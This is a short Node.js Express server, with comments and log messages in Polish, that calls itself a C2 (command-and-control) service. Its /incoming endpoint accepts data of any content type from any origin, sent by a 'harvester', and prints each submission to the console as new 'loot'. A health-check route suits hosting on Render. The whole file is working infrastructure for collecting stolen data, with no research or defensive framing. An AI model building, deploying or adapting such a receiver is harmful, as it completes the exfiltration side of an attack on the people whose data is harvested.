const express = require('express');
const cors = require('cors');
const app = express();

app.use(cors());
app.use(express.json());
app.use(express.text({ type: '*/*' }));

// Punkt dla Render Health Check
app.get('/healthz', (req, res) => res.sendStatus(200));

// Odbiornik danych z kombajnu
app.post('/incoming', (req, res) => {
    console.log(`\n\x1b[41m[ ALERT: NOWY ŁUP ]\x1b[0m`);
    console.log(`GODZINA: ${new Date().toLocaleTimeString()}`);
    console.log(`DANE:`, req.body);
    res.status(200).send("Dostarczono");
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, () => console.log(`FGP C2 LIVE ON PORT ${PORT}`));
